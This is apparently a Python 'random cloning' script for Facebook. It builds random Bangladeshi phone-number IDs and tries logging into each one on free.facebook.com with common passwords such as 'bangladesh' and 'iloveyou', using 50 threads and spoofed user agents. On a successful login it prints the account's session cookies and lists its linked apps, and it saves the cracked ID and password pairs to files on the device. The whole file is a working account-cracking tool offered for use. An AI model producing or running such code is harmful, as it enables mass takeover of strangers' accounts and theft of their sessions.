import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
def o():
    os.system('clear')
    print(logo)
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    jalan(" \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;195m START RANDOM CLONING \033[1;91m[\033[1;97mWORKING\033[1;91m]")
    print(" \033[38;5;196m[\033[38;5;195mB\033[38;5;196m]\033[38;5;195m MY FB ACCOUNT")
    print(" \033[38;5;196m[\033[38;5;195mC\033[38;5;196m]\033[38;5;195m MY FB GROUP")
    print(" \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;195m MY GITHUB ACCOUNT")
    print(" \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;195m EXIT")
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    HASAN = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m Choice Option \033[38;5;196m: ')
    if HASAN == 'A':
        Hasan()
    if HASAN == 'B':
        os.system('xdg-open https://www.facebook.com/Twoaha.Rubaiya1')
        return None
    if HASAN == 'C':
        os.system('xdg-open https://facebook.com/Twoaha.Rubaiya1')
        return None
    if HASAN == 'D':
        os.system('xdg-open https://www.github.com/TWOAHA')
        return None
    if HASAN == 'E':
        os.system('exit')
        return None
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;196mSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \033[38;5;196m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;196m Sorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \033[38;5;196m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""

\033[1;96m######## ##      ##  #######     ###    ##     ##    ###    
\033[1;96m   ##    ##  ##  ## ##     ##   ## ##   ##     ##   ## ##   
\033[1;96m   ##    ##  ##  ## ##     ##  ##   ##  ##     ##  ##   ##  
\033[1;96m   ##    ##  ##  ## ##     ## ##     ## ######### ##     ## 
\033[1;96m   ##    ##  ##  ## ##     ## ######### ##     ## ######### 
 \033[1;96m  ##    ##  ##  ## ##     ## ##     ## ##     ## ##     ## 
 \033[1;96m  ##     ###  ###   #######  ##     ## ##     ## ##     ## 


\033[1;96m
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m AUTHOR  \033[1;96m : \033[1;96mTWOAHA IBN JALAL
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m FACEBOOK\033[1;96m : \033[1;96mNILAY SARKER (TWOAHA) 
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m GITHUB  \033[1;96m : \033[1;96mTWOAHA
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m TOOLS   \033[1;96m : \033[1;96mRANDOM CLONING
\033[1;96m[\033[1;96\033[1;96m]\033[1;96m VERSION \033[1;96m : \033[1;96m0.1
\033[1;96m\n""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[38;5;196mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;196mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hasan = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :hasan = ' ~> 2009'
        elif uid[:8] in ['10000000']        :hasan = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hasan = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hasan = ' 2010'
        elif uid[:6] in ['100001']          :hasan = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hasan = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :hasan = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :hasan = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hasan = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :hasan = ' ~> 2015'
        elif uid[:5] in ['10001']           :hasan = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :hasan = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :hasan = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :hasan = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :hasan = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:hasan = ' ~> 2021'
        elif uid[:5] in ['10008']           :hasan = ' ~>2022'
        elif uid[:5] in ['10009']           :hasan = ' ~> 2023'
        else:hasan=''
    elif len(uid) in [9,10]:
        hasan = ' ~> 2008/2009'
    elif len(uid)==8:
        hasan = ' ~> 2007/2008'
    elif len(uid)==7:
        hasan = ' ~> 2006/2007'
    else:hasan=''
    return hasan
    
    
    
# APK CHECK
def Hasan():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m Example : \033[38;5;45m019,\033[38;5;46m017,\033[38;5;45m018,\033[38;5;192m016{x}')
    print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '0184'
    rk5 = '0188'
    rk6 = '0163'
    rk7 = '0195'
    rk8 = '0199'
    rk9 = '0191'
    code = random.choice([rk1,rk2,rk3,rk4,rk5,rk6,rk7,rk8,rk9])                      
    pww = input(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;45m Choose : \033[38;5;46m')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m EXAMPLE : \033[38;5;45m2000, \033[38;5;46m3000, \033[38;5;45m5000 \n \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;45m PUT CLONING LIMIT:\033[38;5;46m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        tl = str(len(user))
        print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
        jalan(' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m SIM CODE  \033[38;5;196m: \033[38;5;46m'+code)
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOTAL IDS: {xr}\033[38;5;46m'+tl)
        print(f'{x} \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m THE PROCESS HAS BEEN STARTED')
        print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            pwx = [love, "bangladesh","freefire","iloveyou","freefirelover","pubglovar","@#@#@#","@@##@@##"]
            uid = code+love
            setu.submit(rcrack,uid,pwx,tl)
    print(f"\n{x}  \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
    'method': 'POST',
    'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=kesTZL_K1uoh-f8ob1WISbby; sb=kesTZJw0htnYFGJUIE_q-pr_; dnonce=AWm14ZztV9hKF7I_ddvd1_Q5OsKSnuTH2nddJjOAb70yLmEuhxVqgTSN-9-gITdmQqFfDR_Jj4UB_MAA2dRi8PSR; fr=0SQekDtOefPyDLvg6..BkE-uR.ZV.AAA.0.0.BkE-vC.AWVlwlSI2FE',
    'origin': 'https://free.facebook.com',
    'referer': 'https://free.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('    \033[38;5;45m[TWOAHA-OK] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[User-Agent]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIES] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/TWOAHA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\r\r\33[1;31m [TWOAHA-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/TWOAHA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sTWOAHA\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass

o()
